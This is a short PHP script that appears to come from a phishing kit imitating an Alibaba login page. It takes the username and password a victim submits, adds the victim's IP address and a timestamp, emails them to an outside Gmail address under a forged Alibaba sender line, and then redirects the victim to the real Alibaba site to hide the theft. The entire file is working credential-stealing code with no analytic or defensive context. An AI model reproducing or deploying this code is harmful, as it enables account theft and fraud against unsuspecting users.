<?php

$msg = "---------------------------------------------------------------------------------------\n";
$msg .= "Alibaba Login\n";
$msg .= "---------------------------------------------------------------------------------------\n";
$msg .= "Username 	: ".$_POST['user']."\n";
$msg .= "Password 	: ".$_POST['pass']."\n";
$msg .= "---------------------------------------------------------------------------------------\n";
$msg .= "Sent from IP : ".$_SERVER['REMOTE_ADDR']." on time : ".date("m-d-y g:i:a")."\n";
$msg .= "---------------------------------------------------------------------------------------\n";


$to = "hackerlady512@gmail.com";
$subject = "Alibaba Login Info";
$from = "From: Alibaba Update<news@update.Alibaba.com>";

mail($to,$subject,$msg,$from);

header("Location: http://www.alibaba.com");
?>